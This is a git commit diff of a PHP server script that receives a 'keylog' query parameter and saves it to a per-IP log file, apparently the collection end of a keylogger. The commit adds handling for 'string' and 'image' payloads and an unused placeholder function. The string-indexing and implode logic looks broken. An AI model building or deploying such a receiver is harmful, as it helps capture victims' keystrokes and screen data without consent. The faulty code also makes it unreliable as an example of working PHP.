6b17318b2bc4ff55c3e7878e928c8fb9cde0ac48
RumbleFrog <xxlosttechxx@gmail.com>
2016-08-06 12:22:56 -0400

    Update server.php

--- server.php
+++ server.php
@@ -1,9 +1,22 @@
 <?php
+function replace_a_line($data) {
+   if (stristr($data, 'certain word')) {
+     return "replaement line!\n";
+   }
+   return $data;
+}
+$ip = $_SERVER['REMOTE_ADDR'];
 $stringData = $_GET["keylog"];
 if($stringData == "undefined") {
   die();
 }
 else {
-file_put_contents('text/'.$_SERVER['REMOTE_ADDR'].'/log.txt', $stringData);
+  $data = ('text/' . $ip . '/log.txt');
+  if (explode(':', $stringData)['0'] == "string") {
+   $data['0'] = $stringData;
+ } elseif (explode(':', $stringData)['0'] == "image") {
+   $data['1'] = $stringData;
+ }
+ file_put_contents('text/' . $ip . '/log.txt', implode('', $data));
 }
 ?>
